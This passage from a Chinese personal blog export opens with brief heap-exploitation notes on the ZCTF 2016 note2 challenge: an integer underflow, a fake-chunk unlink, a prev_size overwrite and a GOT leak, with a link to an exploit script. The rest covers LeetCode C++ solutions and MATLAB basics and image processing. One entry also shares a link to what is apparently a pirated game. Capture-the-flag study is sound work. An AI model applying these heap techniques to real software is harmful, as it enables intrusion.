<p>overwrite_append() 函数里有数组长度检查，没有堆溢出<br>教程这里，将输入的长度设为0x00，造成整数溢出？？因为确实0x00-1=0xffffffff，同时设置成0x00，还是会分配0x20的空间</p>
<p>The first will hold our fake chunk for the unlink. The second chunk we will use to <code>overflow the metadata of the third chunk</code>. The third chunk will be the one which we overwrite the <code>heap metadata to point to the fake chunk,</code> and we free it.<br>只用修改prev_size</p>
<hr>
<pre><code>0x23ce320:    0x0000000000000000    0x0000000000000021
0x23ce330:    0x3535353535353535    0x3535353535353535
0x23ce340:    0x00000000000000a0    0x0000000000000090
0x23ce350:    0x3131313131313100    0x3131313131313131</code></pre>
<p>溢出</p>
<p><a href="https://github.com/Finsenty54/attack-code/blob/master/heap/zctf_2016_note2/exploit.py">https://github.com/Finsenty54/attack-code/blob/master/heap/zctf_2016_note2/exploit.py</a><br>攻击代码<br><strong>泄露got表中内容，即实际地址值</strong></p>
]]></content>
      <categories>
        <category>heap</category>
      </categories>
      <tags>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode 1 two sum</title>
    <url>/2020/11/26/leetcode-1-two-sum/</url>
    <content><![CDATA[<p>leetcode 1 two sum</p>
<h3 id="学到的东西"><a href="#学到的东西" class="headerlink" title="学到的东西"></a>学到的东西</h3><h4 id="hash-table-哈希表"><a href="#hash-table-哈希表" class="headerlink" title="hash-table 哈希表"></a>hash-table 哈希表</h4><p>散列表<br>是根据键（Key）而直接访问在内存储存位置的数据结构</p>
<p>若关键字为k，则其值存放在f(k)的存储位置上。由此，不需比较便可直接取得所查记录。称这个对应关系f为散列函数，按这个思想建立的表为散列表。</p>
<a id="more"></a>
<p>例如知道值为3 ， 可以直接知道地址为2<br>地址index=H（key）</p>
<hr>
<h4 id="c-模板"><a href="#c-模板" class="headerlink" title="c++模板"></a>c++模板</h4><h4 id="Vector"><a href="#Vector" class="headerlink" title="Vector"></a>Vector</h4><p>向量（Vector）是一个封装了动态大小数组的顺序容器（Sequence Container）。</p>
<p>可以简单的认为，向量是一个能够存放任意类型的动态数组。</p>
<h4 id="unordered-map"><a href="#unordered-map" class="headerlink" title="unordered_map"></a>unordered_map</h4><p><a href="https://blog.csdn.net/qq_21997625/article/details/84672775">https://blog.csdn.net/qq_21997625/article/details/84672775</a></p>
<p><code>mymap.insert(make_pair(nums[i],i));</code><br>小技巧</p>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><p><a href="https://github.com/Finsenty54/my_leetcode_cplusplus/blob/main/two_num_hash_map.cpp">https://github.com/Finsenty54/my_leetcode_cplusplus/blob/main/two_num_hash_map.cpp</a></p>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode add two numbers</title>
    <url>/2020/11/29/leetcode-add-two-numbers/</url>
    <content><![CDATA[<h2 id="leetcode-add-two-numbers"><a href="#leetcode-add-two-numbers" class="headerlink" title="leetcode add two numbers"></a>leetcode add two numbers</h2><p>本题关于singly-linked list 单链表<br>链表是怎么链接在一起的？？怎么存储的？？</p>
<a id="more"></a>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">ListNode *<span class="title">Solution::addTwoNumbers</span><span class="params">(ListNode *l1, ListNode *l2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ListNode *answer = <span class="literal">nullptr</span>;</span><br><span class="line">    ListNode **curr = &amp;answer; <span class="comment">//指向指针的指针,一种间接寻址方式</span></span><br><span class="line">                               <span class="comment">//将answer的地址赋给curr,（64位）</span></span><br><span class="line">    ListNode *addr1 = l1;</span><br><span class="line">    ListNode *addr2 = l2;</span><br><span class="line">    <span class="keyword">int</span> carry = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (addr1 != <span class="literal">nullptr</span> || addr2 != <span class="literal">nullptr</span> ||carry&gt;<span class="number">0</span>) <span class="comment">//do not use for()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (addr1!=<span class="literal">nullptr</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            sum+=addr1-&gt;val;</span><br><span class="line">            addr1=addr1-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (addr2!=<span class="literal">nullptr</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            sum+=addr2-&gt;val;</span><br><span class="line">            addr2=addr2-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        sum+=carry;</span><br><span class="line">        carry = sum / <span class="number">10</span>;</span><br><span class="line">        (*curr) = <span class="keyword">new</span> ListNode(sum % <span class="number">10</span>); <span class="comment">//每次新建一个node,不用取名</span></span><br><span class="line">        <span class="comment">//*curr 取得是curr地址中的64位内容，**curr 就要取两次地址中的内容</span></span><br><span class="line">        <span class="comment">//这是变量，这是把新建node的地址赋给answer,填满64位</span></span><br><span class="line">        <span class="comment">//https://www.runoob.com/cplusplus/cpp-pointer-to-pointer.html</span></span><br><span class="line">        curr = &amp;((*curr)-&gt;next); <span class="comment">//把next本身的地址赋给curr</span></span><br><span class="line">        <span class="comment">//-&gt; 相当于 *，跳转 取内容</span></span><br><span class="line">        sum=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> answer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>解决方法：每次新建一个，匿名新建</p>
<hr>
<pre><code>ListNode *curr = nullptr; //指向指针的指针,一种间接寻址方式
ListNode *answer = curr;</code></pre>
<p>这样赋值后，answer得到是nullptr</p>
<pre><code>ListNode *answer = nullptr;
ListNode **curr = &amp;answer; //指向指针的指针,一种间接寻址方式</code></pre>
<p>这样赋值后，curr得到是answer本身的地址，而不是内容</p>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>matlab_haar1</title>
    <url>/2020/02/11/matlab_haar1/</url>
    <content><![CDATA[<pre><code>waveletfamilies(&#39;a&#39;)
waveletfamilies(&#39;f&#39;)
waveinfo(&#39;db&#39;)</code></pre>
<p> use wfilters, wavefun, and wpfun to obtain the filters, wavelet, or wavelet packets </p>
<a id="more"></a>
<hr>
<p>linspace<br><code>Generate linearly spaced vectorcollapse all in page</code><br>Syntax<br>y = linspace(x1,x2)<br>y = linspace(x1,x2,n)</p>
<hr>
<p>小波的含义，即为时间上衰减快，和傅里叶的正弦波相比要短。<br>在频率域上，通过拉伸或压缩小波的长度，来改变小波的长短和频率，实现不同频率下的小波系数。<br>小波中，一般用尺度scale来衡量小波的频率f，两者之间的转换关系为：<br>scale∗f=Fs∗wcfscale * f=Fs * wcf<br>scale∗f=Fs∗wcf<br>公式中，Fs代表信号的采样频率，wcf为小波的中心频率（wave central freq），在matlab里可以用 centfrq(wavename) 来查询。<br> 噪点 高频信号</p>
<hr>
<p>imagesc<br>Display image with scaled colors</p>
<hr>
<p>尺度函数又称为小波父函数<br>phi 希腊文</p>
<hr>
<p><code>haart2（x，level)</code><br>If level is greater than 1, then h, v, and d are cell arrays. If level is equal to 1, then h, v, and d are matrices.<br>2-D Haar wavelet transform</p>
<hr>
<p><code>ihaart2</code><br>Inverse 2-D Haar wavelet transform</p>
]]></content>
      <tags>
        <tag>matlab</tag>
      </tags>
  </entry>
  <entry>
    <title>matlab_haar2</title>
    <url>/2020/02/12/matlab_haar2/</url>
    <content><![CDATA[<p><code>imbinarize</code><br>Binarize 2-D grayscale image or 3-D volume by thresholding</p>
<hr>
<a id="more"></a>

<p>64:1<br>ans =<br>  空的 1×0 double 行向量<br><del>我人傻了</del><br><code>注意文件所在文件夹</code><br><del>这两个问题弄了我一下午</del></p>
<hr>
<p>图形的函数 fliplr 可以从左往右地翻转矩阵</p>
<hr>
<p>我觉得我懂炒股了<br><a href="http://player.bilibili.com/player.html?aid=68967083&cid=119544791&page=1">https://player.bilibili.com/player.html?aid=68967083&amp;cid=119544791&amp;page=1</a></p>
]]></content>
      <tags>
        <tag>matlab</tag>
      </tags>
  </entry>
  <entry>
    <title>matlab_haar3</title>
    <url>/2020/02/18/matlab_haar3/</url>
    <content><![CDATA[<p>RGB  三个二维数组分别表示R,G,B<br>即，如果imshow的参数类型为double ，那么参数的取值范围只有在[0 1]才会正常显示。当值大于1时，都显示白色。这与matlab的传统是一致的， 对于灰度图像，uint8表示范围是[0 255] ,double表示范围是[0 1]</p>
<a id="more"></a>
<p>isequal()</p>
<p>塞尔达荒野之息Onedrive</p>
<pre><code>https://imhuanggh-my.sharepoint.com/:f:/g/personal/bin_imhuanggh_onmicrosoft_com/EhOlmQivpRBLh3BLkqxyDLYBW0JDW1V7i8lixd1T1Df-4g</code></pre>
]]></content>
      <tags>
        <tag>matlab</tag>
      </tags>
  </entry>
  <entry>
    <title>matlab图像示例笔记1</title>
    <url>/2020/02/06/matlab%E5%9B%BE%E5%83%8F%E7%A4%BA%E4%BE%8B%E7%AC%94%E8%AE%B01/</url>
    <content><![CDATA[<h3 id="对比度"><a href="#对比度" class="headerlink" title="对比度"></a>对比度</h3><p>histogram  直方图<br>Precede the call to <code>imhist </code>with the <code>figure </code>command so that the histogram does not overwrite the display of the image I in the current figure window.</p>
<p>To see the distribution of intensities in the image, <code>create a histogram by calling the imhist</code> function.<br>输入图片，图片要求为灰度图或者二值图 imhist</p>
<a id="more"></a>
<pre><code>F=imread(&#39;test.jpg&#39;);
I=rgb2gray(F);
[count,x]=imhist(I，30)</code></pre>
<p><del>% 获取直方图的横坐标和纵坐标，即各个像素级，以及每个像素级上的像素出现的次数<br>figure;</del></p>
<pre><code>subplot(221);imhist(I,2);
subplot(222);imhist(I,5);
subplot(223);imhist(I,10);
subplot(224);imhist(I);

figure;
subplot(121); imhist(I,10)
[count,x] = imhist(I,10)
subplot(122);stem(x,count);</code></pre>
<blockquote>
<p>stem<br>绘制离散序列数据</p>
</blockquote>
<p><code>Improve the contrast </code>in an image, using the <code>histeq function</code>. The toolbox includes several other functions that perform contrast adjustment, including <code>imadjust</code> and <code>adapthisteq</code>, and interactive tools such as the Adjust Contrast tool, available in the Image Viewer<br>adjust the contrast </p>
<blockquote>
<p>灰度直方图均衡化histeq</p>
</blockquote>
<hr>
<h3 id="Correct-Nonuniform-Background-Illumination-and-Analyze-Foreground-Objects"><a href="#Correct-Nonuniform-Background-Illumination-and-Analyze-Foreground-Objects" class="headerlink" title="Correct Nonuniform Background Illumination and Analyze Foreground Objects"></a>Correct Nonuniform Background Illumination and Analyze Foreground Objects</h3><p>nonuniform</p>
<blockquote>
<p>strel（）<br>Morphological structuring element</p>
</blockquote>
<p><code>J = imopen(I,SE) </code>performs morphological opening on the grayscale or binary image I, returning the opened image, J. SE is a single structuring element object returned by the <code>strel or offsetstrel functions</code>. The morphological open operation is an erosion followed by a dilation, using the same structuring element for both operations.</p>
<p>surf<br>曲面图全页折叠<br>语法<br>surf(X,Y,Z)<br>surf(X,Y,Z,C)</p>
<p><code>f1=imadjust（f，[low_in  high_in],[low_out  high_out],gamma）</code><br>该函数的意义如图1所示，把图像f 灰度变换到新图像f1的过程中，f 中灰度值<code>低于low_in</code>的像素点在f1中灰度值被赋值为<code>low_out</code>,同理，f中灰度值<code>高于high_in</code>的像素点变换到f1时其灰度值也被赋值为<code>high_out</code>;</p>
<blockquote>
<p>J=imadjust(I,[0.2 0.5],[0 1])<br>原图像灰度范围为0-255，程序将小于255×0.2的灰度值设置为0，将大于255×0.5的灰度值设置为255</p>
</blockquote>
<p>饱和度取决于该色中含色成分和消色成分（灰色）的比例<br>比度指的是一幅图像中明暗区域最亮的白和最暗的黑之间不同亮度层级的测量，差异范围越大代表对比越大</p>
<p>Use the<code> imbinarize function</code> to convert the grayscale image into a<code> binary image</code></p>
<p><code>Remove background noise</code> from the image with the<code> bwareaopen function</code>.</p>
<p>F = false(sz1,…,szN) 是由逻辑值“0”组成的 sz1×…×szN 数组，其中 sz1,…,szN 表示每个维度的大小。例如，false(2,3) 返回由逻辑值“0”组成的 2×3 数组。</p>
]]></content>
      <tags>
        <tag>matlab</tag>
      </tags>
  </entry>
  <entry>
    <title>matlab图像示例笔记2</title>
    <url>/2020/02/07/matlab%E5%9B%BE%E5%83%8F%E7%A4%BA%E4%BE%8B%E7%AC%94%E8%AE%B02/</url>
    <content><![CDATA[<h4 id="dicom-（a-image-type-using-in-medical"><a href="#dicom-（a-image-type-using-in-medical" class="headerlink" title="dicom （a image type using in medical)"></a>dicom （a image type using in medical)</h4><p>To read <code>metadata </code>from a DICOM file, use the <code>dicominfo function</code></p>
<hr>
<p>To read<code>image data</code>from a DICOM file, use the <code>dicomread function.</code></p>
<a id="more"></a>
<hr>
<p>If you just want to view the <code>metadata in a DICOM file</code>, for debugging purposes, you can use the<code> dicomdisp function.</code></p>
<hr>
<p>use one of the toolbox image display functions <code>imshow or imtool.</code></p>
<hr>
<p>the image data in this DICOM file is signed <code>16-bit data</code>, you must use the autoscaling syntax with either display function to make the image viewable.<br><code>imshow(I,&#39;DisplayRange&#39;,[])</code></p>
<hr>
<p>use the <code>dicomanon function</code>. Remove Confidential Information</p>
<hr>
<p>To write image data or metadata to a file in DICOM format, use the <code>dicomwrite function</code>.</p>
<hr>
<h4 id="Create-New-DICOM-Series"><a href="#Create-New-DICOM-Series" class="headerlink" title="Create New DICOM Series"></a>Create New DICOM Series</h4><pre><code>info.SeriesInstanceUID</code></pre>
<p>Generate a new DICOM unique identifier (UID) using the <code>dicomuid function.</code></p>
<pre><code>uid = dicomuid
info.SeriesInstanceUID = uid;
dicomwrite(Imodified,&#39;ankle_newseries.dcm&#39;,info);</code></pre>
<hr>
<p>The example finds the maximum and minimum values of all pixels in the image. The pixels that form the white <code>text characters </code>are<code> set to the maximum pixel value</code>. </p>
<hr>
<p>MATLAB command prompt: Enter dicomBrowser.</p>
<hr>
<p><a href="https://ww2.mathworks.cn/help/releases/R2018a/images/image-type-conversions.html" title="Image Type Conversion">Image Type Conversion</a></p>
]]></content>
      <tags>
        <tag>matlab</tag>
      </tags>
  </entry>
  <entry>
    <title>matlab图像示例笔记3</title>
    <url>/2020/02/10/matlab%E5%9B%BE%E5%83%8F%E7%A4%BA%E4%BE%8B%E7%AC%94%E8%AE%B03/</url>
    <content><![CDATA[<p><code>mat2gray</code> 将dicom变为grey<br><code>im2uint8</code></p>
<hr>
<a id="more"></a>

<p> The image on the right has higher contrast, <code>with intensity values that fill the entire intensity range [0, 255].</code></p>
<hr>
<p><del>如果指定空矩阵 ([])，则 imshow 使用 [min(I(:)) max(I(:))]。换言之，使用 I 中的最小值作为黑色，使用最大值作为白色。</del></p>
<hr>
<p>imadjust<br>You must specify the intensities as values between 0 and 1 regardless of the class of I. If I is uint8, the values you supply are multiplied by 255 to determine the actual values to use; if I is uint16, the values are multiplied by 65535. </p>
<hr>
<p>figure<code>, </code>imshow(pout_histeq)<code>;</code><br>title(‘Histeq’);</p>
<hr>
<p>ROI<br>Create a Binary Mask<br>You can use the createMask function of the imroi base class to create a binary mask for any type of ROI object — impoint, imline, imrect, imellipse, impoly, or imfreehand. </p>
]]></content>
      <tags>
        <tag>matlab</tag>
      </tags>
  </entry>
  <entry>
    <title>matlab笔记1</title>
    <url>/2020/01/30/matlab%E7%AC%94%E8%AE%B01/</url>
    <content><![CDATA[<p><code>a = [1 2 3 4]</code><br>创建矩阵的另一种方法是使用 ones、zeros 或 rand 等函数。例如，创建一个由零组成的 5×1 列向量。<br><code>z = zeros(5,1)</code></p>
<hr>
<p>MATLAB 允许您使用单一的算术运算符或函数来处理矩阵中的所有值。<br><code>a + 10</code></p>
<hr>
<a id="more"></a>

<p>要转置矩阵，请使用单引号 (‘)</p>
<hr>
<p>format 命令可以显示更多小数位数：</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">format long</span><br><span class="line">p = a<span class="emphasis">*inv(a)</span></span><br><span class="line"><span class="emphasis">format short</span></span><br></pre></td></tr></table></figure>
<p>format 仅影响数字显示，而不影响 MATLAB 对数字的计算或保存方式。</p>
<hr>
<p>要执行元素级乘法（而非矩阵乘法），请使用 .* 运算符：<br><code>p = a.*a</code><br>乘法、除法和幂的矩阵运算符分别具有执行元素级运算的对应数组运算符。例如，计算 a 的各个元素的三次方：<br><code>a.^3</code></p>
<hr>
<p>串联是连接数组以便形成更大数组的过程。实际上，第一个数组是通过将其各个元素串联起来而构成的。成对的方括号 [] 即为串联运算符。<br><code>A = [a,a]</code></p>
<hr>
<p>使用逗号将彼此相邻的数组串联起来称为水平串联。每个数组必须具有相同的行数。同样，如果各数组具有相同的列数，则可以使用分号垂直串联。<br><code>A = [a; a]</code></p>
<hr>
<p>要表示复数的虚部，请使用 i 或 j。</p>
<pre><code>c = [3+4i, 4+3j; -i, 10j]
c = 2×2 complex</code></pre>
<hr>
<p><code>clc</code></p>
<hr>
<blockquote>
<p>每个变量都是一个可包含许多数字的数组</p>
</blockquote>
<hr>
<p>引用数组中的特定元素有两种方法。最常见的方法是指定行和列下标，例如<br><code>A(4,2)</code><br>另一种方法不太常用，但有时非常有用，即使用单一下标按顺序向下遍历每一列：<br><code>A(8)</code><br>可以在赋值语句左侧指定当前维外部的元素。数组大小会增大以便容纳新元素。<br><code>A(4,5) = 17</code></p>
<hr>
<p>要引用多个数组元素，请使用冒号运算符，这使您可以指定一个格式为<code>start:end</code>的范围。例如，列出 A 前三行及第二列中的元素：<br><code>A(1:3,2)</code><br>单独的冒号（没有起始值或结束值）指定该维中的所有元素。例如，选择 A 第三行中的所有列：<br><code>A(3,:)</code></p>
<hr>
<p>冒号运算符还允许您使用较通用的格式<code>start: step :end</code>创建等距向量值。如果省略中间的步骤（如 <code>start:end</code> 中），MATLAB 会使用默认步长值 1。<br><code>B = 0:10:100</code></p>
<hr>
<p>退出 MATLAB 后，工作区变量不会保留。使用<code>save</code>命令保存数据以供将来使用，<br><code>save myfile.mat</code><br>要清除工作区中的所有变量，请使用<code>clear</code>命令。<br>使用 load 将 MAT 文件中的数据还原到工作区。<br><code>load myfile.mat</code></p>
]]></content>
      <tags>
        <tag>matlab</tag>
      </tags>
  </entry>
  <entry>
    <title>matlab笔记2</title>
    <url>/2020/02/01/matlab%E7%AC%94%E8%AE%B02/</url>
    <content><![CDATA[<p>处理文本时，将字符序列括在单引号中。可以将文本赋给变量。<br><code>myText = &#39;Hello, world&#39;;</code><br>如果文本包含单引号，使用两个单引号。</p>
<pre><code>otherText = &#39;You&#39;&#39;re right&#39;
otherText = 
&#39;You&#39;re right&#39;</code></pre>
<hr>
<a id="more"></a>

<p><code>whos</code>查询已有变量</p>
<hr>
<p>可以使用方括号串联字符数组，就像串联数值数组一样。<br><code>longText = [myText,&#39; - &#39;,otherText]</code></p>
<p>要将数值转换为字符，使用 num2str 或 int2str 等函数。</p>
<pre><code>f = 71;
c = (f-32)/1.8;
tempText = [&#39;Temperature is &#39;,num2str(c),&#39;C&#39;]</code></pre>
<hr>
<p>调用函数，例如 max，请将其输入参数括在圆括号中，存在多个输入参数，请使用逗号加以分隔，存在多个输出参数，请将其括在方括号中：</p>
<pre><code>[maxA,location] = max(A)
maxA = 5
location = 3</code></pre>
<hr>
<p>任何字符输入括在单引号中：<br><code>disp(&#39;hello world&#39;)</code></p>
<hr>
<p>创建二维线图，请使用 plot（绘制） 函数。</p>
<pre><code>x = 0:pi/100:2*pi; 创建矩阵的一种方法
y = sin(x);
plot(x,y）</code></pre>
<p>标记轴并添加标题。</p>
<pre><code>xlabel(&#39;x&#39;)
ylabel(&#39;sin(x)&#39;)
title(&#39;Plot of the Sine Function&#39;)</code></pre>
<p>向 plot 函数添加第三个输入参数，您可以使用红色虚线绘制相同的变量。<br><code>plot(x,y,&#39;r--&#39;)</code><br>‘r–’ 为线条设定。每个设定可包含表示线条颜色、样式和标记的字符。标记是在绘制的每个数据点上显示的符号，例如，+、o 或 <em>。例如，’g:</em>‘ 请求绘制使用 * 标记的绿色点线。</p>
<p>将绘图添加到现有图窗中，请使用 hold on。在使用 hold off 或关闭窗口之前，当前图窗窗口中会显示所有绘图</p>
<pre><code>hold on
y2 = cos(x);
plot(x,y2,&#39;:&#39;)
legend(&#39;sin&#39;,&#39;cos&#39;) legend就是添加图例的标注
比如：legend(&#39;First&#39;,&#39;Second&#39;,-1)，表示字符串依次注释plot中的图，后面板的参数（此处是-1）表示注释的位置。
hold off</code></pre>
<hr>
<p>三维图通常显示一个由带两个变量的函数（即 z = f (x,y)）定义的曲面图。</p>
<p><code>[X,Y] = meshgrid(-2:.2:2); </code> STEP=0.2  meshgrid函数生成的X，Y是大小相等的矩阵</p>
<p>surf 函数及其伴随函数 mesh 以三维形式显示曲面图。surf 使用颜色显示曲面图的连接线和面。mesh 生成仅以颜色标记连接定义点的线条的线框曲面图。</p>
<hr>
<p>使用 subplot 函数可以在同一窗口的不同子区域显示多个绘图。<br>subplot 的前两个输入表示每行和每列中的绘图数。第三个输入指定绘图是否处于活动状态。</p>
<hr>
<blockquote>
<p>键入脚本名称即可运行该脚本。脚本是最简单的一种 MATLAB® 程序。脚本是一个包含多行连续 MATLAB 命令和函数调用的扩展名为<code>.m</code>的文件。在命令行中<em>键入脚本名称</em>即可运行该脚本。<br>要创建脚本，请使用 edit 命令。<br><code>edit plotrand</code><br>使用百分比 (%) 符号添加注释</p>
</blockquote>
<hr>
<pre><code>nsamples = 5;
npoints = 50;
for k = 1:nsamples
    currentData = rand(npoints,1);
    sampleMean(k) = mean(currentData);
end
overallMean = mean(sampleMean)

if overallMean &lt; .49
   disp(&#39;Mean is less than expected&#39;)
elseif overallMean &gt; .51
   disp(&#39;Mean is greater than expected&#39;)
else
   disp(&#39;Mean is within the expected range&#39;)
end</code></pre>
<hr>
<p>使用 doc 命令在单独的窗口中打开函数文档。<br><code>doc mean</code><br>在键入函数输入参数的左括号之后暂停，此时命令行窗口中会显示相应函数的提示<br>使用 help 命令可在命令行窗口中查看相应函数的简明文档。</p>
<hr>
<p>使用空格或逗号分隔行的元素。<br>使用分号 ; 表示每行末尾。<br>使用方括号 [ ] 将整个元素列表括起来。</p>
<p>sum(A) 计算列<br>sum(A’)’<br>避免双重转置的其他方法，请在 sum 函数中使用维度参数：<br><code>sum(A,2)</code></p>
<p><code>diag(A)</code> 获取对角线值</p>
<hr>
<p>图形的函数 fliplr 可以从左往右地翻转矩阵：<br><code>sum(diag(fliplr(A)))</code></p>
<hr>
<p>magic 函数创建几乎任意大小的幻方矩阵。行列对角线相加都相同<br>四个用于生成基本矩阵的函数。<br>zeros<br>全部为零<br>ones<br>全部为 1<br>rand<br>均匀分布的随机元素<br>randn<br>正态分布的随机元素</p>
<hr>
<p>MATLAB 不需要任何类型声明或维度说明。当 MATLAB 遇到新的变量名称时，它会自动创建变量，并分配适当大小的存储。如果此变量已存在，MATLAB 会更改其内容，并根据需要分配新存储。</p>
<p>MATLAB 仅使用名称的前 N 个字符（其中 N 是函数 namelengthmax 返回的数字） 为63</p>
]]></content>
      <tags>
        <tag>matlab</tag>
      </tags>
  </entry>
  <entry>
    <title>matlab笔记3</title>
    <url>/2020/02/02/matlab%E7%AC%94%E8%AE%B03/</url>
    <content><![CDATA[<p>科学记数法使用字母 e 来指定 10 次方的缩放因子<br>浮点数的有限精度约为 16 位有效小数位数，有限范围约为 10-308 至 10+308。双精度格式表示的数字的最大精度为 52 位。整数的可用精度为 8 位、16 位、32 位和 64 位</p>
<pre><code>x = uint64(36028797018963968);
y = uint64(36028797018963972);</code></pre>
<a id="more"></a>
<hr>
<p>例如，sort 函数根据量值进行排序，如果量值相等，则根据相位角度排序。</p>
<pre><code>sort([3+4i, 4+3i])  量值都为5
ans =
   4.0000 + 3.0000i   3.0000 + 4.0000i
angle(3+4i)
ans =
    0.9273</code></pre>
<p>“等于”关系运算符 == 要求实部和虚部相等。其他二进制关系运算符 &gt;、&lt;、&gt;= 和 &lt;= 忽略数字的虚部，而仅考虑实部。</p>
<hr>
<p>数组运算对构建表非常有用。假定 n 为列向量<br><code>n = (0:9)&#39;;</code><br>然后，<br><code>pows = [n  n.^2  2.^n]</code><br>构建一个平方和 2 次幂的表：</p>
<pre><code>pows =
     0     0     1
     1     1     2
     2     4     4
     3     9     8
     4    16    16
     5    25    32
     6    36    64
     7    49   128
     8    64   256
     9    81   512</code></pre>
<hr>
<pre><code>format short g
x = (1:0.1:2)&#39;;
logs = [x log10(x)]</code></pre>
<p>构建一个对数表。</p>
<pre><code> logs =
      1.0            0 
      1.1      0.04139
      1.2      0.07918
      1.3      0.11394
      1.4      0.14613
      1.5      0.17609
      1.6      0.20412
      1.7      0.23045
      1.8      0.25527
      1.9      0.27875
      2.0      0.30103</code></pre>
<hr>
<p>有关初等数学函数的列表，请键入<br>help elfun<br>有关更多高等数学函数和矩阵函数的列表，请键入<br>help specfun<br>help elmat</p>
<hr>
<p>format 函数控制所显示的值的数值格式。</p>
<pre><code>x = [4/3 1.2345e-6]

format short

   1.3333    0.0000

format short e

   1.3333e+000  1.2345e-006

format short g

   1.3333  1.2345e-006

format long

   1.33333333333333   0.00000123450000

format long e

   1.333333333333333e+000    1.234500000000000e-006

format long g

   1.33333333333333               1.2345e-006

format bank

   1.33          0.00

format rat

   4/3          1/810045

format hex

   3ff5555555555555   3eb4b6231abfd271</code></pre>
<p>语句无法容纳在一行中，请使用省略号（三个句点）**…**</p>
<p>要进一步控制输出格式，请使用 sprintf 和 fprintf 函数。</p>
<hr>
<pre><code>100:-7:50
sum(A(1:4,4))
sum(A(:,end)) end 引用最后一个行或列</code></pre>
<p>为什么 4×4 幻方矩阵的幻数和等于 34？如果将介于 1 到 16 之间的整数分为四个总和相等的组，该总和必须为<br>sum(1:16)/4<br>当然，也即<br>ans =<br>     34</p>
<p><code>B = [A  A+32; A+48  A+16]</code></p>
<hr>
<p>要删除 X 的第二列，请使用<br><code>X(:,2) = []</code></p>
<p><code>X( 2 : 2 : 10) = [] </code> 按列数第几个<br>生成<br><code>X =     16     9     2     7    13    12     1</code></p>
]]></content>
      <tags>
        <tag>matlab</tag>
      </tags>
  </entry>
  <entry>
    <title>matlab笔记4</title>
    <url>/2020/02/03/matlab%E7%AC%94%E8%AE%B04/</url>
    <content><![CDATA[<pre><code>B = A - 8.5
B(1:2,2:3) = 0
x = [2.1 1.7 1.6 1.5 NaN 1.9 1.8 1.5 5.1 1.8 1.4 2.2 1.6 1.8];
x = x(isfinite(x))
x =
  2.1 1.7 1.6 1.5 1.9 1.8 1.5 5.1 1.8 1.4 2.2 1.6 1.8
x = x(abs(x-mean(x)) &lt;= 3*std(x))
x =
  2.1 1.7 1.6 1.5 1.9 1.8 1.5 1.8 1.4 2.2 1.6 1.8</code></pre>
<a id="more"></a>
<hr>
<p>find 函数可用于确定与指定逻辑条件相符的数组元素的索引。find 以最简单的形式返回索引的列向量。转置该向量以便获取索引的行向量。</p>
<pre><code>k = find(isprime(A))&#39;
k =
     2     5     9    10    11    13</code></pre>
<p><code>R = randn(3,4,5);</code></p>
<hr>
<p>MATLAB 中的元胞数组是以其他数组的副本为元素的多维数组<br><code>C = &#123;A sum(A) prod(prod(A))&#125;</code><br>。第一，要检索某个元胞的内容，请在花括号中使用下标。例如，C{1} 检索幻方矩阵，C{3} 为 16!。第二，<strong>元胞数组包含其他数组的副本，而不包含指向这些数组的指针</strong>。</p>
<pre><code>M = cell(8,1); 元胞数组
for n = 1:8
   M&#123;n&#125; = magic(n);
end
M</code></pre>
<hr>
<p><code>v = [s; &#39;world&#39;]</code><br>垂直联接字符并生成</p>
<pre><code>v =
   Hello
   world</code></pre>
<p>char 函数可执行这种填充操作。例如，<br><code>S = char(&#39;A&#39;,&#39;rolling&#39;,&#39;stone&#39;,&#39;gathers&#39;,&#39;momentum.&#39;)</code></p>
<p>也可以将文本存储在元胞数组中。例如，</p>
<p><code>C = &#123;&#39;A&#39;;&#39;rolling&#39;;&#39;stone&#39;;&#39;gathers&#39;;&#39;momentum.&#39;&#125;</code></p>
<p>可以将填充后的字符数组转换为字符向量元胞数组：<br><code>C = cellstr(S)</code><br>使用以下语句可以逆转此过程<br><code>S = char(C)</code></p>
<hr>
<p>结构体是多维 MATLAB 数组，包含可按文本字段标志符访问的元素。例如，</p>
<pre><code>S.name = &#39;Ed Plum&#39;;
S.score = 83;
S.grade = &#39;B+&#39;

S = 
     name: &#39;Ed Plum&#39;
    score: 83
    grade: &#39;B+&#39;</code></pre>
<p>可以一次添加一个字段，</p>
<pre><code>S(2).name = &#39;Toni Miller&#39;;
S(2).score = 91;
S(2).grade = &#39;A-&#39;;</code></pre>
<p>可以使用一个语句添加整个元素：</p>
<pre><code>S(3) = struct(&#39;name&#39;,&#39;Jerry Garcia&#39;,... 
               &#39;score&#39;,70,&#39;grade&#39;,&#39;C&#39;)</code></pre>
<p>键入<br><code>S.score</code><br>与键入<br><code>S(1).score, S(2).score, S(3).score</code><br>相同，这是一个逗号分隔列表。</p>
<pre><code>scores = [S.score]
names = char(S.name)
names = &#123;S.name&#125;
[N1 N2 N3] = S.name</code></pre>
<p>访问结构体数据的另一种方法是使用动态字段名称。这些名称将字段表示为变量表达式，MATLAB 会在运行时计算这些表达式。此处显示的点-括号语法将 expression 作为动态字段名称：<br><code>structName.(expression)</code><br>例如，要在字段名称中计算 expression，并在行 7 中的 1 至 25 列内获取该字段的值，请使用<br><code>structName.(expression)(7,1:25)</code></p>
]]></content>
      <tags>
        <tag>matlab</tag>
      </tags>
  </entry>
  <entry>
    <title>matlab笔记5 image</title>
    <url>/2020/02/05/matlab%E7%AC%94%E8%AE%B05/</url>
